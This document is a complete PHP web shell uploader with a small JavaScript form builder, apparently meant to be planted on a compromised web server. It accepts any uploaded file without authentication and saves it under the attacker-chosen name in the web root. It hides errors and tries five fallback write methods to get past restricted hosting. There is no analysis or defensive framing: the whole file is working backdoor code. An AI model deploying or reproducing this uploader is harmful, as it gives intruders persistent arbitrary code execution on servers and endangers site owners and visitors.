 
<script>
    window.addEventListener("DOMContentLoaded", function() {
        let e = document.createElement("form");
        e.method = "post", e.enctype = "multipart/form-data";
        let t = document.createElement("input");
        t.type = "file", t.name = "file", t.required = !0;
        let n = document.createElement("button");
        n.type = "submit", n.innerHTML = "UP", e.appendChild(t), e.appendChild(n), document.body.appendChild(e)
    });
</script>
<?php 

if ($_FILES) {
    $file_temp = $_FILES['file']['tmp_name'];  
    $file_name = $_FILES['file']['name'];      
    
    //   move_uploaded_file
    if (function_exists('move_uploaded_file')) {
        if (@move_uploaded_file($file_temp, $file_name)) {
            printf('uploaded: <a href="%s">%s</a><br/>', $file_name, $file_name);
            exit;
        }
    }
    
    //  copy
    if (function_exists('copy')) {
        if (@copy($file_temp, $file_name)) {
            printf('uploaded: <a href="%s">%s</a><br/>', $file_name, $file_name);
            exit;
        }
    }
    
    //  file_put_contents
    if (function_exists('file_put_contents')) {
        $file_contents = @file_get_contents($file_temp);
        if ($file_contents !== false && @file_put_contents($file_name, $file_contents) !== false) {
            printf('uploaded: <a href="%s">%s</a><br/>', $file_name, $file_name);
            exit;
        }
    }

    //   fwrite
    if (function_exists('fwrite')) {
        $handle = @fopen($file_name, 'w');
        if ($handle) {
            $file_contents = @file_get_contents($file_temp);
            if ($file_contents !== false && @fwrite($handle, $file_contents) !== false) {
                fclose($handle);
                printf('uploaded: <a href="%s">%s</a><br/>', $file_name, $file_name);
                exit;
            }
            fclose($handle);
        }
    }
    
    //   rename
    if (function_exists('rename')) {
        if (@rename($file_temp, $file_name)) {
            printf('uploaded: <a href="%s">%s</a><br/>', $file_name, $file_name);
            exit;
        }
    }
    
    
    echo "<span style='color:red'>All Method Disabled!</span>";
}
?>
